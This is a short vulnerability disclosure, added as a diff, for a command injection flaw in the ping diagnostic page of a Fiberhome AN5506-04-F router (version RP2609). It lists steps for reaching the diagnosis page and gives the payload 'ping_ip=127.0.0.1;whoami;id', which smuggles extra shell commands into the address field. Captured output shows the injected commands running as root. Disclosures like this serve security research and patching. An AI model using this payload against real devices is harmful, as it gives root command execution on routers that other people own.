@@ -1,0 +1,38 @@
+# Exploit Title: Fiberhome an5506-04-f  – -PING- COMMAND INJECTION
+# Date: 03.10.2017
+# Exploit Author: Tauco
+# Vendor Homepage: http://hk.fiberhomegroup.com
+# Version: RP2609
+# Tested on: Windows 10
+
+
+Description:
+===========================================================================
+Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application.
+ 
+https://www.owasp.org/index.php/Command_Injection
+
+
+Proof of Concepts :
+
+=======================================
+1. Go to the Default Gateway
+2. Open the application
+3. Open diagnosis
+4. Input command to the Destination Address
+5. Click Ping
+
+ping_ip=127.0.0.1;whoami;id
+
+PING 127.0.0.1 (127.0.0.1): 56 data bytes
+64 bytes from 127.0.0.1: seq=0 ttl=64 time=0.617 ms
+64 bytes from 127.0.0.1: seq=1 ttl=64 time=0.259 ms
+64 bytes from 127.0.0.1: seq=2 ttl=64 time=0.215 ms
+64 bytes from 127.0.0.1: seq=3 ttl=64 time=0.214 ms
+64 bytes from 127.0.0.1: seq=4 ttl=64 time=0.218 ms
+
+--- 127.0.0.1 ping statistics ---
+5 packets transmitted, 5 packets received, 0% packet loss
+round-trip min/avg/max = 0.214/0.304/0.617 ms
+root
+uid=0(root) gid=0 groups=0
